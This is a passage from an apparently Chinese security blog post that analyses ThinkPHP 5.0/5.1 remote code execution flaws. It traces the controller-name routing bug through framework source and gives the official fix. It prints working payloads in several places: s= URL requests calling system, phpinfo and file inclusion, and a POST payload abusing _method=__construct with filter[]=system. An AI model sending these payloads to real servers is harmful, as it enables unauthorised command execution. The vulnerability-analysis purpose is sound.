class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>这里以以这个POC进行分析，ThinkPHP 版本为<code>5.1.30</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><p>![image-20200923201833962](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923201833962.png)</p><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p></blockquote><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>不同版本的Payload，需要做相关的调整。</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在5.1.31的更新中，查看相关更新的信息，其中关于<code>修正控制器名获取</code> 的commit</p><p>![image-20200923221710652](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923221710652.png)</p><p>另外，官方对于此处更新，专门发了一次微信公告。<a href="https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A">https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A</a></p><p>内容如下：</p><blockquote><p>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的<code>getshell</code>漏洞，受影响的版本包括<code>5.0</code>和<code>5.1</code>版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150733.png" alt="image-20200923225433768"></p><p>默认情况下，ThinkPHP 不开启强制路由，并且开启了路由器兼容模式，<code>s</code>。</p><p>5.1.31 修复地址：<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><p>两个关键点：</p><ul><li>控制器名</li><li>强制路由</li></ul><p>by 七月火师傅：</p><blockquote><p>在没有开启强制路由，说明我们可以使用路由兼容模式 <strong>s</strong> 参数，而框架对控制器名没有进行足够的检测，说明可能可以调用任意的控制器，那么我们可以试着利用 <code>http://site/?s=模块/控制器/方法</code> 来测试一下。在先前的 <strong>ThinkPHP SQL注入</strong> 分析文章中，我们都有提到所有用户参数都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法处理，该方法会调用 <strong>filterValue</strong> 方法，而 <strong>filterValue</strong> 方法中使用了 <strong>call_user_func</strong> ，那么我们就来尝试利用这个方法。</p></blockquote><p><a href="https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select">https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p><code>call_user_func($filter,$value);</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150312.png" alt="image-20200923230344961"></p><p>可以看到系统命令成功执行。</p><p>根据修复的内容：对控制器名的获取，直接在获取控制器的地方下断点，来进行调试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150235.png" alt="image-20200923231658510"></p><p>得出：控制器名是通过<code>$result[1]</code> 来获取的。</p><blockquote><p>而 <strong>$result</strong> 的值来源于兼容模式下的 <strong>pathinfo</strong> ，即 <strong>s</strong> 参数</p></blockquote><p>继续进行单步调试，程序会来到App类下的<code>run</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150152.png" alt="image-20200924094001917"></p><p>继续调用<code>Dispatch</code>类的<code>run</code>方法，该方法调用了<code>exec</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测路由after行为</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">&#x27;after&#x27;</span>])) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">&#x27;after&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="keyword">return</span> $dispatch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据自动验证</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">&#x27;validate&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">&#x27;validate&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化控制器</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> (<span class="params">Request $request, $next</span>) <span class="title">use</span> (<span class="params">$instance</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前操作名</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// 执行操作方法</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 空操作</span></span><br><span class="line">            $call    = [$instance, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 操作不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . get_class($instance) . <span class="string">&#x27;-&gt;&#x27;</span> . $action . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;action_begin&#x27;</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure><p>利用了反射机制，调用类的方法，这里类和方法都可控。</p><p>该方法中，<strong>未对实例化控制器和操作名进行任何过滤、合法性检测操作，这就是导致远程代码执行的直接原因。</strong></p><hr><p>如果直接拿该版本的 <strong>payload</strong> 去测试 <strong>ThinkPHP5.0.x</strong> 版本，会发现很多 <strong>payload</strong> 都不能成功。其原因是两个大版本已加载的类不同，导致可利用的类也不尽相同。具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.1.x                  ThinkPHP 5.0.x</span><br><span class="line">stdClass                        stdClass </span><br><span class="line">Exception                       Exception </span><br><span class="line">ErrorException                  ErrorException </span><br><span class="line">Closure                         Closure </span><br><span class="line">Generator                       Generator </span><br><span class="line">DateTime                        DateTime </span><br><span class="line">DateTimeImmutable               DateTimeImmutable </span><br><span class="line">DateTimeZone                    DateTimeZone </span><br><span class="line">DateInterval                    DateInterval </span><br><span class="line">DatePeriod                      DatePeriod </span><br><span class="line">LibXMLError                     LibXMLError </span><br><span class="line">DOMException                    DOMException </span><br><span class="line">DOMStringList                   DOMStringList </span><br><span class="line">DOMNameList                     DOMNameList </span><br><span class="line">DOMImplementationList           DOMImplementationList </span><br><span class="line">DOMImplementationSource         DOMImplementationSource </span><br><span class="line">DOMImplementation               DOMImplementation </span><br><span class="line">DOMNode                         DOMNode </span><br><span class="line">DOMNameSpaceNode                DOMNameSpaceNode </span><br><span class="line">DOMDocumentFragment             DOMDocumentFragment </span><br><span class="line">DOMDocument                     DOMDocument </span><br><span class="line">DOMNodeList                     DOMNodeList </span><br><span class="line">DOMNamedNodeMap                 DOMNamedNodeMap </span><br><span class="line">DOMCharacterData                DOMCharacterData </span><br><span class="line">DOMAttr                         DOMAttr </span><br><span class="line">DOMElement                      DOMElement </span><br><span class="line">DOMText                         DOMText </span><br><span class="line">DOMComment                      DOMComment </span><br><span class="line">DOMTypeinfo                     DOMTypeinfo </span><br><span class="line">DOMUserDataHandler              DOMUserDataHandler </span><br><span class="line">DOMDomError                     DOMDomError </span><br><span class="line">DOMErrorHandler                 DOMErrorHandler </span><br><span class="line">DOMLocator                      DOMLocator </span><br><span class="line">DOMConfiguration                DOMConfiguration </span><br><span class="line">DOMCdataSection                 DOMCdataSection </span><br><span class="line">DOMDocumentType                 DOMDocumentType </span><br><span class="line">DOMNotation                     DOMNotation </span><br><span class="line">DOMEntity                       DOMEntity </span><br><span class="line">DOMEntityReference              DOMEntityReference </span><br><span class="line">DOMProcessingInstruction        DOMProcessingInstruction </span><br><span class="line">DOMStringExtend                 DOMStringExtend </span><br><span class="line">DOMXPath                        DOMXPath </span><br><span class="line">finfo                           finfo </span><br><span class="line">LogicException                  LogicException </span><br><span class="line">BadFunctionCallException        BadFunctionCallException </span><br><span class="line">BadMethodCallException          BadMethodCallException </span><br><span class="line">DomainException                 DomainException </span><br><span class="line">InvalidArgumentException        InvalidArgumentException </span><br><span class="line">LengthException                 LengthException </span><br><span class="line">OutOfRangeException             OutOfRangeException </span><br><span class="line">RuntimeException                RuntimeException </span><br><span class="line">OutOfBoundsException            OutOfBoundsException </span><br><span class="line">OverflowException               OverflowException </span><br><span class="line">RangeException                  RangeException </span><br><span class="line">UnderflowException              UnderflowException </span><br><span class="line">UnexpectedValueException        UnexpectedValueException </span><br><span class="line">RecursiveIteratorIterator       RecursiveIteratorIterator </span><br><span class="line">IteratorIterator                IteratorIterator </span><br><span class="line">FilterIterator                  FilterIterator </span><br><span class="line">RecursiveFilterIterator         RecursiveFilterIterator </span><br><span class="line">CallbackFilterIterator          CallbackFilterIterator </span><br><span class="line">RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator </span><br><span class="line">ParentIterator                  ParentIterator </span><br><span class="line">LimitIterator                   LimitIterator </span><br><span class="line">CachingIterator                 CachingIterator </span><br><span class="line">RecursiveCachingIterator        RecursiveCachingIterator </span><br><span class="line">NoRewindIterator                NoRewindIterator </span><br><span class="line">AppendIterator                  AppendIterator </span><br><span class="line">InfiniteIterator                InfiniteIterator </span><br><span class="line">RegexIterator                   RegexIterator </span><br><span class="line">RecursiveRegexIterator          RecursiveRegexIterator </span><br><span class="line">EmptyIterator                   EmptyIterator </span><br><span class="line">RecursiveTreeIterator           RecursiveTreeIterator </span><br><span class="line">ArrayObject                     ArrayObject </span><br><span class="line">ArrayIterator                   ArrayIterator </span><br><span class="line">RecursiveArrayIterator          RecursiveArrayIterator </span><br><span class="line">SplFileInfo                     SplFileInfo </span><br><span class="line">DirectoryIterator               DirectoryIterator </span><br><span class="line">FilesystemIterator              FilesystemIterator </span><br><span class="line">RecursiveDirectoryIterator      RecursiveDirectoryIterator </span><br><span class="line">GlobIterator                    GlobIterator </span><br><span class="line">SplFileObject                   SplFileObject </span><br><span class="line">SplTempFileObject               SplTempFileObject </span><br><span class="line">SplDoublyLinkedList             SplDoublyLinkedList </span><br><span class="line">SplQueue                        SplQueue </span><br><span class="line">SplStack                        SplStack </span><br><span class="line">SplHeap                         SplHeap </span><br><span class="line">SplMinHeap                      SplMinHeap </span><br><span class="line">SplMaxHeap                      SplMaxHeap </span><br><span class="line">SplPriorityQueue                SplPriorityQueue </span><br><span class="line">SplFixedArray                   SplFixedArray </span><br><span class="line">SplObjectStorage                SplObjectStorage </span><br><span class="line">MultipleIterator                MultipleIterator </span><br><span class="line">SessionHandler                  SessionHandler </span><br><span class="line">ReflectionException             ReflectionException </span><br><span class="line">Reflection                      Reflection </span><br><span class="line">ReflectionFunctionAbstract      ReflectionFunctionAbstract </span><br><span class="line">ReflectionFunction              ReflectionFunction </span><br><span class="line">ReflectionParameter             ReflectionParameter </span><br><span class="line">ReflectionMethod                ReflectionMethod </span><br><span class="line">ReflectionClass                 ReflectionClass </span><br><span class="line">ReflectionObject                ReflectionObject </span><br><span class="line">ReflectionProperty              ReflectionProperty </span><br><span class="line">ReflectionExtension             ReflectionExtension </span><br><span class="line">ReflectionZendExtension         ReflectionZendExtension </span><br><span class="line">__PHP_Incomplete_Class          __PHP_Incomplete_Class </span><br><span class="line">php_user_filter                 php_user_filter </span><br><span class="line">Directory                       Directory </span><br><span class="line">SimpleXMLElement                SimpleXMLElement </span><br><span class="line">SimpleXMLIterator               SimpleXMLIterator </span><br><span class="line">SoapClient                      SoapClient </span><br><span class="line">SoapVar                         SoapVar </span><br><span class="line">SoapServer                      SoapServer </span><br><span class="line">SoapFault                       SoapFault </span><br><span class="line">SoapParam                       SoapParam </span><br><span class="line">SoapHeader                      SoapHeader </span><br><span class="line">PharException                   PharException </span><br><span class="line">Phar                            Phar </span><br><span class="line">PharData                        PharData </span><br><span class="line">PharFileInfo                    PharFileInfo </span><br><span class="line">XMLReader                       XMLReader </span><br><span class="line">XMLWriter                       XMLWriter </span><br><span class="line">ZipArchive                      ZipArchive </span><br><span class="line">PDOException                    PDOException </span><br><span class="line">PDO                             PDO </span><br><span class="line">PDOStatement                    PDOStatement </span><br><span class="line">PDORow                          PDORow </span><br><span class="line">CURLFile                        CURLFile </span><br><span class="line">Collator                        Collator </span><br><span class="line">NumberFormatter                 NumberFormatter </span><br><span class="line">Normalizer                      Normalizer </span><br><span class="line">Locale                          Locale </span><br><span class="line">MessageFormatter                MessageFormatter </span><br><span class="line">IntlDateFormatter               IntlDateFormatter </span><br><span class="line">ResourceBundle                  ResourceBundle </span><br><span class="line">Transliterator                  Transliterator </span><br><span class="line">IntlTimeZone                    IntlTimeZone </span><br><span class="line">IntlCalendar                    IntlCalendar </span><br><span class="line">IntlGregorianCalendar           IntlGregorianCalendar </span><br><span class="line">Spoofchecker                    Spoofchecker </span><br><span class="line">IntlException                   IntlException </span><br><span class="line">IntlIterator                    IntlIterator </span><br><span class="line">IntlBreakIterator               IntlBreakIterator </span><br><span class="line">IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator </span><br><span class="line">IntlCodePointBreakIterator      IntlCodePointBreakIterator </span><br><span class="line">IntlPartsIterator               IntlPartsIterator </span><br><span class="line">UConverter                      UConverter </span><br><span class="line">JsonIncrementalParser           JsonIncrementalParser </span><br><span class="line">mysqli_sql_exception            mysqli_sql_exception </span><br><span class="line">mysqli_driver                   mysqli_driver </span><br><span class="line">mysqli                          mysqli </span><br><span class="line">mysqli_warning                  mysqli_warning </span><br><span class="line">mysqli_result                   mysqli_result </span><br><span class="line">mysqli_stmt                     mysqli_stmt </span><br><span class="line">Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c </span><br><span class="line">think\Loader                    think\Loader</span><br><span class="line">think\Error                     think\Error </span><br><span class="line">think\Container                 think\Config </span><br><span class="line">think\App                       think\App </span><br><span class="line">think\Env                       think\Request </span><br><span class="line">think\Config                    think\Hook </span><br><span class="line">think\Hook                      think\Env </span><br><span class="line">think\Facade                    think\Lang </span><br><span class="line">think\facade\Env                think\Log </span><br><span class="line">env                             think\Route</span><br><span class="line">think\Db </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\facade\Route </span><br><span class="line">route </span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule </span><br><span class="line">think\route\RuleGroup </span><br><span class="line">think\route\Domain </span><br><span class="line">think\route\RuleItem </span><br><span class="line">think\route\RuleName </span><br><span class="line">think\route\Dispatch </span><br><span class="line">think\route\dispatch\Url </span><br><span class="line">think\route\dispatch\Module </span><br><span class="line">think\Middleware </span><br><span class="line">think\Cookie </span><br><span class="line">think\View </span><br><span class="line">think\view\driver\Think </span><br><span class="line">think\Template </span><br><span class="line">think\template\driver\File </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File </span><br><span class="line">think\Session </span><br><span class="line">think\Debug </span><br><span class="line">think\Cache </span><br><span class="line">think\cache\Driver </span><br><span class="line">think\cache\driver\File </span><br></pre></td></tr></table></figure><h2 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h2><p>by Mochazz:</p><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote><p>代码层面：增加对控制器名的合法性检查。</p><p>应急层面：临时开启强制路由。</p></blockquote><p>官方的修复方法是：增加正则表达式 <code>^[A-Za-z](\w)*$</code> ，对控制器名进行合法性检测。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST 